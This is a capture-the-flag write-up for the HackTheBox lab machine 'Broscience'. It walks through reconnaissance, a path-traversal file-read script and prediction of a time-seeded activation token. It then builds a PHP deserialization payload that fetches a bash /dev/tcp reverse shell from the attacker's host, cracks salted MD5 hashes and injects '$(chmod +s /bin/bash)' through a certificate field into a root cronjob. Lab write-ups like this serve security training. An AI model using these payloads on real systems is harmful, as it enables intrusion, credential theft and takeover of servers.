---
title: HackTheBox - Broscience
author: 0
date: 2023-04-07 16:00:00 +0800
categories: [htb, machine]
tags: [local-file-inclusion, php, insecure-randomness, httponly, insecure-deserialization, cracking-hashes, certs, command-injection, openssl, cronjob, pspy]
render_with_liquid: false
---

This machine is a medium Linux box and starts out with a website that shows a bunch of fitness related blogs. The website also has a login and registration page.

 ## Reconnaissance
```bash
$ nmap -sC -sV  -A  -oN nmap_result 10.10.11.195
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-07 07:36 CEST
Nmap scan report for 10.10.11.195
Host is up (0.021s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
|_http-server-header: Apache/2.4.54 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
|_http-title: BroScience : Home
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports 22, 80 and 443 are open. A few other interesting results in the  `nmap` result are:
- The use of a self-signed certification
- The `httponly` cookie flag not being set. This flag is a tag added to a browser cookie that prevents client-side scripts from accessing data. It prevents the cookie from being accessed by anything other than the server. 

Due to this website having a self-signed certificate that relies on the commonName field, we need to use the `-k` option when running `gobuster`. This option skips SSL certificate verification. The error we would otherwise receive is:
>Error: error on running `gobuster`: unable to connect to https://broscience.htb/: invalid certificate: x509: certificate relies on legacy Common Name field, use SANs instead

```bash
$ gobuster dir -w ~/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://broscience.htb/ -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/07 08:23:59 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
/server-status        (Status: 403) [Size: 280]
Progress: 220506 / 220561 (99.98%)
===============================================================
2023/04/07 08:39:37 Finished
===============================================================
```

The `includes` folder looks the most interesting. When checking this directory out we get this result:
```
Index of /includes
[ICO]	Name	    Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	db_connect.php	2023-04-07 02:55 	337 	 
[ ]	header.php	    2023-04-07 02:55 	369 	 
[ ]	img.php	        2023-04-07 02:55 	483 	 
[ ]	navbar.php	    2023-04-07 02:55 	1.2K	 
[ ]	utils.php	    2023-04-07 02:55 	3.0K	 
Apache/2.4.54 (Debian) Server at broscience.htb Port 443
```

When opening `https://broscience.htb/includes/img.php`. We get the message:
>Error: Missing 'path' parameter.

Because this is a PHP application we could use some other wordlists as well to find more PHP pages:
```bash
$ gobuster dir -w ~/wordlists/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u https://broscience.htb/ -k 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/wordlists/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/07 11:22:07 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 9304]
/user.php             (Status: 200) [Size: 1309]
/login.php            (Status: 200) [Size: 1936]
/comment.php          (Status: 302) [Size: 13] [--> /login.php]
/register.php         (Status: 200) [Size: 2161]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/exercise.php         (Status: 200) [Size: 1322]
/activate.php         (Status: 200) [Size: 1256]
Progress: 5104 / 5164 (98.84%)
===============================================================
2023/04/07 11:22:20 Finished
===============================================================
```

#### Local File Inclusion

To automate finding a right payload, we used a the [dotdotpwn payload list](https://raw.githubusercontent.com/foospidy/payloads/master/other/traversal/dotdotpwn.txt).

```python
import requests
import sys

# disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

url = sys.argv[1]

with open('dotdotpwn.txt') as file:
    for line in file:
        payload = line.strip()
        # setting verify to False to ignore verifying the SSL certificate
        response = requests.get(url + payload, verify=False)
        print(f"{payload} - {response.status_code}")
        if not ("Error:" in response.text or response.text ==""):
            print(response.text)
            break

```

After running this script, we get a working payload that outputs the `/etc/passwd` file:
```bash
$ python3 dotdot.py "https://broscience.htb/includes/img.php?path="
../etc/passwd - 200
<b>Error:</b> Attack detected.
../etc/issue - 200
<b>Error:</b> Attack detected.
...
...
...
..%252f..%252f..%252f..%252fetc%252fpasswd - 200
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
...
...
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

_We can see there is a user named `bill` and it looks like `postgres` is installed._

The payload that succeeded was `..%252f..%252f..%252f..%252fetc%252fpasswd` and is double URL encoded `../../../../etc/passwd`.

We can now start iterating over all the files we earlier found in our `gobuster` scans.

```python
import requests
import sys
import urllib

# disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

url = sys.argv[1]

with open('directory.txt') as file:
    for line in file:
        line = line.strip()
        payload = f'../../../../../var/www/html/{line}'
        payload = urllib.parse.quote(urllib.parse.quote(payload, safe=""),safe="")
        # setting verify to False to ignore verifying the SSL certificate
        response = requests.get(url + payload, verify=False)
        print(f"{payload} - {response.status_code}")
        if response.status_code == 200:
            print(response.text)
            with open("./dump/"+line, 'wb') as f:
                f.write(response.content)
                f.close()
```

```bash
$ tree     
.
├── activate.php
├── comment.php
├── exercise.php
├── includes
│   ├── db-connect.php
│   └── img.php
├── index.php
├── login.php
├── logout.php
├── register.php
└── user.php
```

When looking through these files, we notice find some details that can help us move forward.

#### includes/db-connect.php
We find the db user and password along with the salt that is being used to store users their password. In the `user.php` file, we found the passwords are stored as a `MD5` hash, which is easy to crack.
```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "**REDACTED**";
$db_salt = "**REDACTED**";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

#### activate.php
We also found the code that handles the activiation code when a new user registers.
```php
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
        include_once 'includes/db_connect.php';

        $res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');
        $res = pg_execute($db_conn, "check_code_query", array($_GET['code']));

        if (pg_num_rows($res) == 1) {
            // Check if account already activated
            $row = pg_fetch_row($res);
            if (!(bool)$row[1]) {
                // Activate account
                $res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');
                $res = pg_execute($db_conn, "activate_account_query", array($row[0]));
                
                $alert = "Account activated!";
                $alert_type = "success";
            } else {
                $alert = 'Account already activated.';
            }
        } else {
            $alert = "Invalid activation code.";
        }
    } else {
        $alert = "Invalid activation code.";
    }
} else {
    $alert = "Missing activation code.";
}
?>
```

#### includes/utils.php
The generation for the activation code, it's a 32 character long code but uses time as the random seed which is insecure as we know the time when we perform a registration request.
Additionally, the method `set_theme` serializes a cookie that stores the `user-prefs`. The method `save($tmp)` in the `Avatar` class stores an image. We could potentially craft a payload that exploits the missing `http-only` flag and perform an insecure deserialization attack that allows us to do remote code execution to spawn a reverse shell. 

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
...
function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>    
?>
```
 ## Foothold
 ### Insecure Randomness in the activation token
To create a cookie that will gain us remote code execute we will need a user account. Once we register the user, we need to store the exact time the request has been done so we can generate the activation code ourselves.

First we register a user, we catch the request through burp to get the response time created.

```
POST /register.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=pvaju0mj9orufo4cmpemh2eaa5
User-Agent: XXX
...
Connection: close

username=test123&email=test123%40hotmail.com&password=test&password-confirm=test
```

Now we need to activate the account, we know by looking at the code we need to send a `GET` request to `/activate.php?code=x`. We first need to generate the code. We use the code in `utils.php` to do so:
```php
$ cat generateCookie.php 
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(strtotime("Fri, 07 Apr 2023 11:00:33 GMT"));
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code;
}

generate_activation_code();
?>
$ php generateCookie.php
CG73wpNUfpp4FeEzSIIz1kv3UMten1V6 
```

We can now send a request with this token:
```
GET /activate.php?code=CG73wpNUfpp4FeEzSIIz1kv3UMten1V6 HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=pvaju0mj9orufo4cmpemh2eaa5
User-Agent: XXX
...
Te: trailers
Connection: close
```

We can now login and start the next step to gain a remote shell.

### Insecure Deserialisation
We know a cookie is generated that stores the theme preference of the user. We can see this cookie being set when the theme is swapped.
```
GET /swap_theme.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=pvaju0mj9orufo4cmpemh2eaa5; user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30%3D
User-Agent: XXX
...
Connection: close
```

To generate our payload, we need to create our own version of the `Avatar` class that contains the payload with the reverse shell that will be stored on the server.

```php
 $ cat avatar.php        
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.19/shell.php";
    public $imgPath = "./shell.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$serialized = base64_encode(serialize(new AvatarInterface));
echo $serialized
?>
$ php avatar.php        
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjE5L3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjk6Ii4vcmV2LnBocCI7fQ== 
```

Create a `shell.php` file in your current working directory and start a http server, that will be called once we will send our request with the malicious payload.

```bash
$ cat shell.php
<?php
  system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.161/4444 0>&1'");
?>
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.195 - - [07/Apr/2023 13:24:39] "GET /shell.php HTTP/1.0" 200 -

```

Change the theme and catch the request in burp. We need to URL encode this value before sending it through the `GET` request.
```
GET /swap_theme.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=pvaju0mj9orufo4cmpemh2eaa5; user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30%253DTzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjE5L3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ%3d%3d
User-Agent: XXX
...
Connection: close
```

Set up a netcat listener:
```bash
$ nc -lvnp 1234                                 
listening on [any] 1234 ..

```
Invoke the shell.php on the broscience server:
```bash
$ curl -k https://broscience.htb/rev.php
```

 ## Privelege Escalation
 We got the shell.

 ```bash
nc -lvnp 1234                                 
listening on [any] 1234 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.195] 56552
bash: cannot set terminal process group (1228): Inappropriate ioctl for device
bash: no job control in this shell
www-data@broscience:/var/www/html$ whoami
www-data
```

We can now query the database and try to get bills password. We can use `\d` to describe all tables and schema in the database.
```bash
www-data@broscience:/var/www/html$ psql -h localhost -d broscience -U dbuser -W
</html$ psql -h localhost -d broscience -U dbuser -W
Password: **REDACTED**

\d
                List of relations
 Schema |       Name       |   Type   |  Owner   
--------+------------------+----------+----------
 public | comments         | table    | postgres
 public | comments_id_seq  | sequence | postgres
 public | exercises        | table    | postgres
 public | exercises_id_seq | sequence | postgres
 public | users            | table    | postgres
 public | users_id_seq     | sequence | postgres
(6 rows)

select * from users;

administrator:15657792073e8a843d4f91fc403454e1 
bill:13edad4932da9dbb57d9cd15b66ed104
michael:bd3dad50e2d578ecba87d5fa15ca5f85 
john:a7eed23a7be6fe0d765197b1027453fe 
dmytro:5d15340bded5b9395d5d14b9c21bc82b 
```

We know the passwords are salted so I first tried to create a file with the hashes in the format: `hash:salt`. Then use `hashcat` in the mode `-m 20` which is `md5($salt.$pass)`.

```bash
$ hashcat -m 20 hashes ~/wordlists/rockyou.txt
```
But this didn't work. Then I went another route, I created a modified version of rockyou.txt with the salt added to the words of the wordlist:

```bash
$ sed 's/^/N**REDACTED**l/' ~/wordlists/rockyou.txt > rockyou2.txt 2>/dev/null
$ cat hashes.txt
administrator:15657792073e8a843d4f91fc403454e1 
bill:13edad4932da9dbb57d9cd15b66ed104
michael:bd3dad50e2d578ecba87d5fa15ca5f85
$ john -w=rockyou2.txt hashes.txt --format=Raw-MD5                     
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
Na**REDACTED**ym (bill)     
Na**REDACTED**es (michael)   
```

After logging into ssh through bill and the above found password. We can do some reconnaissance on the system. We setup a server on our machine that will provide `pspy64`. Once we download it to `/tmp` on the victims machine, we find out a root cronjob is running that is running a `renew_cert.sh` script.

```
bill@broscience:~$ cd /tmp
bill@broscience:/tmp$ wget http://10.10.14.19/pspy64 -o pspy64
bill@broscience:/tmp$ chmod +x pspy64
bill@broscience:/tmp$ ./pspy64
...
2023/04/07 08:42:01 CMD: UID=0     PID=7127   | /usr/sbin/CRON -f 
2023/04/07 08:42:01 CMD: UID=0     PID=7128   | /usr/sbin/CRON -f 
2023/04/07 08:42:01 CMD: UID=0     PID=7129   | /bin/bash /root/cron.sh 
2023/04/07 08:42:01 CMD: UID=0     PID=7130   | /bin/bash /root/cron.sh 
2023/04/07 08:42:01 CMD: UID=0     PID=7131   | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
2023/04/07 08:42:01 CMD: UID=0     PID=7133   | /bin/bash /root/cron.sh 
2023/04/07 08:42:01 CMD: UID=0     PID=7134   |
```

Looking at the `renew_cert.sh` script, we can this script checks the expiration date of the certificates and when it's close to expiring it will print out the information and  see the ability to inject commands in the `commonName` variable.

```bash
bill@broscience:/tmp$ cat /opt/renew_cert.sh
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

At the end of the script it executes the `mv` command. Allowing us to inject commands to add SUID to `/bin/bash`. Because this is injecting a command within a command we need to use `$(COMMAND)`, when the shell encounters a variable, it replaces the variable with its value. However, when a variable is used inside a string, the shell does not expand the variable unless it is enclosed in `${}` or `$(...)` syntax. In this case we will use `$(chmod +s /bin/bash)`.

```bash
    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

We can generate a new cert to add in this arbitrary command:

```bash
bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
Generating a RSA private key
....................++++
...........................................................................................................................................++++
writing new private key to 'broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:State
Locality Name (eg, city) []:city
Organization Name (eg, company) [Internet Widgits Pty Ltd]:company
Organizational Unit Name (eg, section) []:section
Common Name (e.g. server FQDN or YOUR name) []:$(chmod +s /bin/bash)
Email Address []:noreply@decl.com
```

After waiting for the cronjob to trigger, we can see we gained a root shell.

```bash
bill@broscience:~/Certs$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.2M Mar 27  2022 /bin/bash
bill@broscience:~/Certs$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /home/bill/user.txt
**REDACTED**
bash-5.1# cat /root/root.txt
**REDACTED**
```